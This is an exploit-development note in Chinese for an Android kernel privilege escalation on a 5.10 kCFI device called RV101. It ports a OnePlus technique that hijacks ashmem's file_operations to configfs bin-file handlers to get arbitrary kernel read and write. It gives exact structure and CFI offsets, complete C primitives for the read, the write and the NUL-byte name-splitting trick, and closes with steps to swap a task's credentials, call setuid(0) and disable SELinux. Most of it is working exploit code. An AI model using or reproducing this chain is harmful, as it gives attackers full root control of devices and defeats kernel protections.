# GhostLock RV101 — W2 configfs 任意讀寫原語（逐行對照 OnePlus → RV101）
> 📌 **事實依據**：本檔涉及裝置世代、kernel config、CVE 狀態、GhostLock 位移與產品結構等事實時，一律以 [`reports/FACTS.md`](FACTS.md) 為準（單一權威事實表；衝突時以該表裁決）。


> 2026-08-20。本篇把 OnePlus `configfs_read_once`/`configfs_write_once` 的機制在 RV101
> (5.10.209, Clang kCFI) 上**逐行對照**，全部 offset 由本機反組譯 `configfs_read_bin_file`
> (0x49ec40) 與 `configfs_write_bin_file` (0x49ee00) 直接取出，非估算。
> 參考：`research/ghostlock_refs/extracted/oneplus/.../src/core/{util.c,fops.c,target.h}`。

## 0. 核心概念（一張圖）

```
open("/dev/ashmem") → file->private_data = ashmem_area (name[0..] 可被 SET_NAME 控制)
                            │
   用 mode-2 寫入原語把 ashmem_misc.fops(+0x10) 改成 fake_fops（噴灑頁內）
                            │
   read(fd)/write(fd) 現在跳進 fake_fops 的 .read/.write = configfs_*_bin_file.cfi_jt
                            │
   configfs_*_bin_file 把 file->private_data (=ashmem_area) 當成 configfs_buffer
   讀寫 buffer->bin_buffer (0x58) 這個「任意核心位址」→ 任意核心讀/寫
```

關鍵：`configfs_buffer.bin_buffer`（offset **0x58**）就是任意讀寫的目標位址；它由
`ashmem_area.name` 的第 58 個 byte 起（再扣掉 11-byte 前綴）覆蓋，而 `name` 可由
`ioctl(ASHMEM_SET_NAME)` 寫入任意 bytes（含 NUL，用分次 ioctl 技巧）。

---

## 1. RV101 configfs_buffer 的欄位 offset（反組譯定案）

`configfs_write_bin_file` 與 `configfs_read_bin_file` 都以 `file->private_data` 為 buffer：

```asm
configfs_write_bin_file:   ldr x24, [x0, #0xd8]     ; x24 = file->private_data (buffer)
configfs_read_bin_file:    ldr x26, [x0, #0xd8]     ; x26 = file->private_data
```

| 欄位 | offset | 型別 | 證據 |
|---|---|---|---|
| count | 0x00 | size_t | (未直接用到) |
| pos | 0x08 | loff_t | (未直接用到) |
| page | 0x10 | char * | 5.10 layout |
| ops | 0x18 | ptr | 5.10 layout |
| mutex | 0x20 | struct mutex (32B) | `add x19, x24, #0x20; bl mutex_lock` |
| **needs_read_fill** | **0x50** | int | `ldr w8, [x26, #0x50]`（read 判定是否 fill） |
| read_in_progress | 0x54 | bool | `ldrb w8, [x24, #0x54]`（write 檢查） |
| write_in_progress | 0x55 | bool | `strb w8, [x24, #0x55]`（write 設 1） |
| **bin_buffer** | **0x58** | char * | `ldr x23, [x24, #0x58]`（寫目標/讀來源） |
| **bin_buffer_size** | **0x60** | int | `ldrsw x1, [x24, #0x60]` |
| **cb_max_size** | **0x64** | int | `ldrsw x8, [x24, #0x64]` |
| item | 0x68 | struct config_item * | `ldr x0, [x26, #0x68]` |
| owner | 0x70 | ptr | 5.10 layout |
| bin_attr | 0x78 | ptr | `ldr x8, [x26, #0x78]` |

> ⚠️ 這些值與 OnePlus 6.12 不同（6.12 是 bin_buffer=88/bin_buffer_size=96/page=16/
> needs_read_fill=80）。**不要照抄 OnePlus 的 `CFG_*_OFF`**，用上表。

---

## 2. 寫入原語：`configfs_write_once`（對照 `configfs_write_bin_file`）

OnePlus 版本（`util.c:791`）做的事：
```c
ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128]; memset(blob, 0, 128);
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);   // bin_buffer = target
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len); // bin_buffer_size = len
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);       // cb_max_size = 0
  try_set_ashmem_name_blob(fd, blob, 128);   // ioctl SET_NAME（含 NUL 分次寫）
  return pwrite(fd, data, len, 0);           // 觸發 configfs_write_bin_file
}
```

RV101 對照（只換 offset，邏輯同）：
```c
put64(blob, 0x58 - 11, target);   // bin_buffer  = target
put32(blob, 0x60 - 11, len);      // bin_buffer_size = len
put32(blob, 0x64 - 11, 0);        // cb_max_size = 0
```

`pwrite(fd, data, len, 0)` 進入 `configfs_write_bin_file`，其反組譯對照如下：

```asm
0x49ee38: ldrb w8, [x24, #0x54]     ; if (buffer->read_in_progress) return -EBUSY
0x49ee3c: cbz  w8, 0x49ee48
0x49ee40: mov  x20, #-0x1a          ; -26 (EBUSY 路徑)
0x49ee48: mov  w8, #1
0x49ee4c: strb w8, [x24, #0x55]     ; buffer->write_in_progress = 1
0x49ee50: ldr  x8, [x21]            ; x8  = *ppos
0x49ee54: ldrsw x1, [x24, #0x60]    ; x1  = bin_buffer_size
0x49ee58: add  x0, x8, x20          ; x0  = *ppos + count
0x49ee5c: cmp  x0, x1
0x49ee60: b.ls 0x49ee7c             ; 若 *ppos+count <= size → 直接寫（不走 realloc）
0x49ee7c: ldr  x23, [x24, #0x58]    ; x23 = bin_buffer
0x49eedc: mov  x0, x23              ; dst = bin_buffer
0x49eee0: mov  x2, x21              ; ppos
0x49eee4: mov  x3, x22              ; from = user buf
0x49eee8: mov  x4, x20              ; count
0x49eeec: bl   0x4116f0             ; simple_write_to_buffer(bin_buffer, .., ppos, buf, count)
```

**判讀**：`pwrite(fd, data, len, 0)` 使 `*ppos=0`、`count=len`，且 `0+len <= bin_buffer_size(=len)`
成立 → 走 `0x49ee7c` 直接寫路徑，把 `data` 複製到 `bin_buffer+0 = target`。**一次寫入即完成任意寫**。

（`cb_max_size` 只在 `*ppos+count > bin_buffer_size` 時才看，設 0 是為了避免誤觸 vmalloc 重分配路徑；
正常 `0+len<=len` 不會碰到。）

---

## 3. 讀取原語：`configfs_read_once`（對照 `configfs_read_bin_file`）

OnePlus 用 `page`(0x10) 走 `configfs_read_file`；**RV101 更簡單——讀寫都用 `bin_buffer`**，
直接走 `configfs_read_bin_file`：

```c
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128]; memset(blob, 0, 128);
  put64(blob, 0x58 - 11, target);   // bin_buffer = target
  put32(blob, 0x60 - 11, len);      // bin_buffer_size = len
  put32(blob, 0x50 - 11, 0);        // needs_read_fill = 0 → 跳過 item-ops fill
  try_set_ashmem_name_blob(fd, blob, 128);
  return pread(fd, data, len, 0);
}
```

`pread(fd, data, len, 0)` 進入 `configfs_read_bin_file`，關鍵路徑：

```asm
0x49ecc0: ldr  w8, [x26, #0x50]    ; needs_read_fill
0x49eccc: cbz  w8, 0x49ede0        ; ==0 → 直接跳讀（不呼叫 item ops）
   ... (fill 路徑：vmalloc、call item ops，我們不走) ...
0x49ede0: ldr  x3, [x26, #0x58]    ; x3 = bin_buffer
0x49ede4: ldrsw x4, [x26, #0x60]   ; x4 = bin_buffer_size
0x49ede8: mov  x0, x22             ; x0 = buf (user)
0x49edec: mov  x1, x21             ; x1 = count
0x49edf0: mov  x2, x20             ; x2 = ppos
0x49edf4: bl   0x411634            ; simple_read_from_buffer(buf, count, ppos, bin_buffer, size)
```

**判讀**：`needs_read_fill=0` 時，直接 `simple_read_from_buffer(buf, len, ppos=0, bin_buffer=target, size=len)`
→ 從 `target` 讀 `len` bytes 到 `data`。**一次讀取即完成任意讀**。

---

## 4. fake file_operations 表（RV101 要填 `.cfi_jt`，且用 .read/.write 槽位）

RV101 kCFI：fops 表存 `.cfi_jt` 跳表位址（非函數本體）。且 RV101 configfs **用 `.read`/`.write`
（+0x10/+0x18），不是 `.read_iter`/`.write_iter`**（OnePlus 6.12 才是 iter 版）。所以 fake fops：

| 槽位 | offset | 填（RV101 `.cfi_jt` offset） |
|---|---|---|
| llseek | 0x08 | `CFI_NOOP_LLSEEK_OFF`（0x121ab88） |
| read | 0x10 | `CFI_CONFIGFS_READ_BIN_OFF`（0x1238e20） |
| write | 0x18 | `CFI_CONFIGFS_WRITE_BIN_OFF`（0x1238670） |
| unlocked_ioctl | 0x50 | `CFI_ASHMEM_IOCTL_OFF`（0x123e118）← SET_NAME 要用 |
| compat_ioctl | 0x58 | `CFI_ASHMEM_COMPAT_IOCTL_OFF`（0x123e0b8） |
| mmap | 0x60 | `CFI_ASHMEM_MMAP_OFF`（0x122a630） |
| open | 0x70 | `CFI_ASHMEM_OPEN_OFF`（0x123fb70） |
| release | 0x80 | `CFI_ASHMEM_RELEASE_OFF`（0x123ef48） |
| show_fdinfo | 0x0e0 | `CFI_ASHMEM_SHOW_FDINFO_OFF`（0x121cd20） |

其餘槽位填 0。這些 `CFI_*_OFF` 已寫入 `target_rv101.h`（對應 `text_addr(CFI_*_OFF)` 的
link-time VA，KASLR 用 `text_addr()` 換算）。

---

## 5. ASHMEM_SET_NAME 的 NUL 分次寫（`try_set_ashmem_name_blob`）

`ASHMEM_SET_NAME` 是 `strcpy` 語義（遇 NUL 截斷），無法一次寫入含 NUL 的 128-byte blob。
OnePlus 解法（`util.c:337-371`）照搬即可：

```c
#define ASHMEM_SET_NAME _IOW(0x77, 1, char[256])   // RV101 ASHMEM_NAME_LEN=256
static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[256]; memset(name, 0x41, 256);          // 全填 'A'=0x41
  for (size_t i = 0; i < len; i++) name[i] = blob[i] ? blob[i] : 1;  // NUL→0x01
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[256]; memset(name, 0x41, 256);
  for (size_t i = 0; i < pos; i++) name[i] = blob[i] ? blob[i] : 1;
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len)) return -1;
  for (size_t i = len; i > 0; i--)                 // 從尾端逐個把該是 0 的位置設回 0
    if (blob[i-1] == 0 && try_put_blob_zero_at(fd, blob, i-1)) return -1;
  return 0;
}
```

> RV101 確認 `ASHMEM_NAME_LEN`：反組譯 `ashmem_ioctl` 的 SET_NAME 分支或查
> `ashmem_open`；預設 5.10 staging ashmem 為 256。若實測 SET_NAME 只吃 128，把 `name[]`
> 換成 128 即可（我們要的欄位都在前 128 bytes 內）。

---

## 6. 完整 RV101 原語（可直接落入 util.c）

```c
/* 任意核心讀/寫（已換成 RV101 configfs_buffer offset + 11-byte 前綴） */
ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128]; memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF      - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, (uint32_t)len);
  put32(blob, CFG_CB_MAX_SIZE_OFF     - ASHMEM_NAME_PREFIX_LEN, 0);
  if (try_set_ashmem_name_blob(fd, blob, sizeof(blob))) return -1;
  return pwrite(fd, data, len, 0);
}
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128]; memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF      - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, (uint32_t)len);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  if (try_set_ashmem_name_blob(fd, blob, sizeof(blob))) return -1;
  return pread(fd, data, len, 0);
}
uint64_t kernel_read64(int fd, uintptr_t a){ uint64_t v=0; return configfs_read_once(fd,a,&v,8)==8?v:0; }
```

（`put64`/`put32`/`CFG_*_OFF`/`ASHMEM_NAME_PREFIX_LEN` 皆已進 `target_rv101.h`；`put64/put32`
現有 `util.c` 的 `put64p/put32p` 可複用或改名。）

---

## 7. 實作順序提醒（與 OnePlus fops.c 對照）

1. 噴灑頁加 fake fops（§4 表）+ 一個可回寫的 scratch 區。
2. mode-2 寫入：`fake_fops` → `data_addr(ASHMEM_MISC) + 0x10`（**+0x10，不是 +0x18**）。
3. `open("/dev/ashmem")` → fd；先 `configfs_write_once`/`read_once` 對 fake fops 自己的
   `llseek` 槽做一次自檢（OnePlus `try_cfi_stage`/`repair_fake_fops_llseek` 的驗證手法）。
4. 驗證過後：從 `data_addr(INIT_TASK + TASK_TASKS_OFF)` 走 task list，比 `tgid`(0x5cc) 找
   child → `kernel_write64(child_task + TASK_CRED_OFF, data_addr(INIT_CRED))`。
5. child `setuid(0)` + `setenforce 0` → root（`main.c` 骨架已有）。
